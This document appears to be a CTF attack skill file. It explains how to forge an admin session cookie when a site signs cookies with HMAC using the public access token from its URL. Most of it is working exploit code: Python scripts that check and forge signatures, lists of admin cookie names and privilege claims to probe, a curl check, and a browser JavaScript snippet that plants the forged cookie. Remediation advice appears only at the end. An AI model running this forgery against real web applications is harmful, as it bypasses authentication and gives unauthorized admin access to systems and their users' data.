# Cookie HMAC Key Reuse → Admin Authentication Bypass

> If a server uses a public access token from the URL as the Cookie signing key and the backend trusts claims in the Cookie payload, an attacker can forge an admin identity.

---

## Applicable Scenarios

- The target is a Web application. The URL path contains parameters such as `access_token`, `token`, or `key`.
- The response header sets a signed Cookie, such as `student_gate=<payload>.<signature>`.
- Multiple signed Cookies, such as a student Cookie and an admin Cookie, may share one key.
- The backend Cookie payload contains a client-controlled privilege claim, such as `{"admin":true}`.

## Keywords

- HMAC key reuse / signature-key reuse
- Known-key session forgery / session forgery with a known key
- Client-side claims-based auth / claims-based authorization
- Cookie signature bypass / signed-Cookie bypass

## Attack Flow

### Step 1: Extract the access token from the URL

The entry URL usually shows:

```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

Extract the token:

```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

### Step 2: Inspect the student_gate Cookie

Visit the entry URL. The response header sets a signed Cookie. The usual format is:

```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```

Decode the payload to confirm its structure.

### Step 3: Verify the Signature Algorithm

Use the known access token as the HMAC key and try to reproduce the signature:

```python
import hmac, hashlib, base64

access_token = "从URL提取的token"
payload_b64 = "从Cookie提取的payload部分"
expected_sig = "从Cookie提取的签名部分"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("匹配" if computed == expected_sig else "不匹配")
```

If it matches, confirm that the `access token is the HMAC key`.

### Step 4: Guess the Admin Cookie Name and Payload Structure

Common admin Cookie names:

- `admin_session`
- `admin_token`
- `admin_auth`
- `manage_token`
- `backstage_session`

Probe these payload structures one by one until one returns 200:

```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```

### Step 5: Forge the Admin Cookie

```python
import hmac, hashlib, json, base64

access_token = "已知的token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```

### Step 6: Verify Admin Access

```bash
curl -k -H "Cookie: <cookie from the previous step>" https://target/api/admin/me
```

The exploit succeeds when the response is `{"admin":true}` or is a 200 response with admin data.

## Browser Reproduction

```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```

## Remediation

1. Use a separate server-side key to sign Cookies. Do not share it with the URL token.
2. Base admin authorization on a server-side session, not a client-side Cookie payload claim.
3. Use a different signing key for each role.
4. Add and validate `iat` / `exp` / `typ` claims in the Cookie.
5. Handle signature parsing errors silently. Return 401, not 500.

## Related Case

- Admin bypass in the class.pangbaoba.me CTF lab: `student_gate` and `admin_session` share the access token as the HMAC key, so `{"admin":true}` directly grants admin access.

## Related Skills

- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md` — Web runtime analysis
- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md` — Similar token-claim confusion
- `reverse-engineering/languages-platforms.md` — JWT / OAuth references
